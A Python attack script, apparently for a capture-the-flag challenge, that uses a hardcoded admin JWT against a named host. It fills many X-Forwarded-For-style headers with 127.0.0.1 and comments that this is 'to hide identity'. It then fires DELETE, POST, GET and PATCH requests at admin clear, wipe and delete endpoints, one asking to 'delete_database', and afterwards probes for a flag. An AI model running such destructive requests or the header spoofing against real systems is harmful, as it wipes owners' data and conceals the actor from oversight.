#!/usr/bin/env python3
"""
Final Database Deletion - Get the Flag
"""

import requests
import json
import time

base_url = "http://fresh-start-267.emergent.host"
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYTcyMWZjYzEtMTk5OS00NGViLWJjOTQtMDU0YjU4N2E2MDUzIiwiZW1haWwiOiJhZG1pbkBldGhhcmEuYWkiLCJuYW1lIjoiU3lzdGVtIEFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzc3NTMzMTI2fQ.Lu6aYqa4j4EQHX463APGH0n73p_ziCQn3luWUSi-61U"

# Headers to hide IP
headers = {
    "Authorization": f"Bearer {token}",
    "X-Forwarded-For": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
    "X-Originating-IP": "127.0.0.1",
    "X-Remote-IP": "127.0.0.1",
    "X-Remote-Addr": "127.0.0.1",
    "X-Client-IP": "127.0.0.1",
    "X-Host": "127.0.0.1",
    "Forwarded": "for=127.0.0.1",
    "Via": "1.1 127.0.0.1",
}

print("="*60)
print("FINAL DATABASE DELETION ATTEMPT")
print("="*60)
print("\n[*] Using IP spoofing to hide identity")
print("[*] All X-Forwarded headers set to 127.0.0.1")

# Try /api/admin/clear with DELETE
print("\n[1] DELETE /api/admin/clear...")
try:
    resp = requests.delete(f"{base_url}/api/admin/clear", headers=headers, timeout=15)
    print(f"Status: {resp.status_code}")
    print(f"Response: {resp.text[:1000]}")
    
    if 'flag' in resp.text.lower():
        print("\n[!!!] FLAG FOUND IN RESPONSE!")
        
except Exception as e:
    print(f"Error: {e}")

# Try /api/admin/clear with GET
print("\n[2] GET /api/admin/clear...")
try:
    resp = requests.get(f"{base_url}/api/admin/clear", headers=headers, timeout=15)
    print(f"Status: {resp.status_code}")
    print(f"Response: {resp.text[:1000]}")
    
    if 'flag' in resp.text.lower():
        print("\n[!!!] FLAG FOUND IN RESPONSE!")
        
except Exception as e:
    print(f"Error: {e}")

# Try /api/admin/wipe with POST
print("\n[3] POST /api/admin/wipe...")
try:
    resp = requests.post(f"{base_url}/api/admin/wipe", headers=headers, json={}, timeout=15)
    print(f"Status: {resp.status_code}")
    print(f"Response: {resp.text[:1000]}")
    
    if 'flag' in resp.text.lower():
        print("\n[!!!] FLAG FOUND IN RESPONSE!")
        
except Exception as e:
    print(f"Error: {e}")

# Try /api/admin/wipe with PATCH
print("\n[4] PATCH /api/admin/wipe...")
try:
    resp = requests.patch(f"{base_url}/api/admin/wipe", headers=headers, json={}, timeout=15)
    print(f"Status: {resp.status_code}")
    print(f"Response: {resp.text[:1000]}")
    
    if 'flag' in resp.text.lower():
        print("\n[!!!] FLAG FOUND IN RESPONSE!")
        
except Exception as e:
    print(f"Error: {e}")

# Try /api/delete with DELETE
print("\n[5] DELETE /api/delete...")
try:
    resp = requests.delete(f"{base_url}/api/delete", headers=headers, timeout=15)
    print(f"Status: {resp.status_code}")
    print(f"Response: {resp.text[:1000]}")
    
    if 'flag' in resp.text.lower():
        print("\n[!!!] FLAG FOUND IN RESPONSE!")
        
except Exception as e:
    print(f"Error: {e}")

# Try with confirmation parameter
print("\n[6] POST /api/admin/clear with confirm=true...")
try:
    resp = requests.post(f"{base_url}/api/admin/clear", headers=headers, json={"confirm": True}, timeout=15)
    print(f"Status: {resp.status_code}")
    print(f"Response: {resp.text[:1000]}")
    
    if 'flag' in resp.text.lower():
        print("\n[!!!] FLAG FOUND IN RESPONSE!")
        
except Exception as e:
    print(f"Error: {e}")

# Try /api/admin/delete with DELETE
print("\n[7] DELETE /api/admin/delete...")
try:
    resp = requests.delete(f"{base_url}/api/admin/delete", headers=headers, timeout=15)
    print(f"Status: {resp.status_code}")
    print(f"Response: {resp.text[:1000]}")
    
    if 'flag' in resp.text.lower():
        print("\n[!!!] FLAG FOUND IN RESPONSE!")
        
except Exception as e:
    print(f"Error: {e}")

# Try /api/admin with PATCH
print("\n[8] PATCH /api/admin...")
try:
    resp = requests.patch(f"{base_url}/api/admin", headers=headers, json={"action": "delete_database"}, timeout=15)
    print(f"Status: {resp.status_code}")
    print(f"Response: {resp.text[:1000]}")
    
    if 'flag' in resp.text.lower():
        print("\n[!!!] FLAG FOUND IN RESPONSE!")
        
except Exception as e:
    print(f"Error: {e}")

# Check if flag appears after deletion attempts
print("\n" + "="*60)
print("CHECKING FOR FLAG AFTER DELETION ATTEMPTS")
print("="*60)

flag_endpoints = [
    '/api/flag',
    '/api/admin/flag',
    '/flag',
    '/admin/flag',
    '/api/success',
    '/api/admin/success',
    '/api/admin',
]

for endpoint in flag_endpoints:
    try:
        resp = requests.get(f"{base_url}{endpoint}", headers=headers, timeout=5)
        print(f"\n{endpoint}: {resp.status_code}")
        
        if resp.status_code == 200:
            print(f"Response: {resp.text[:500]}")
            
            if 'flag' in resp.text.lower() or 'ethara{' in resp.text.lower():
                print("\n[!!!] FLAG FOUND!")
                
    except Exception as e:
        pass

print("\n" + "="*60)
print("COMPLETE")
print("="*60)
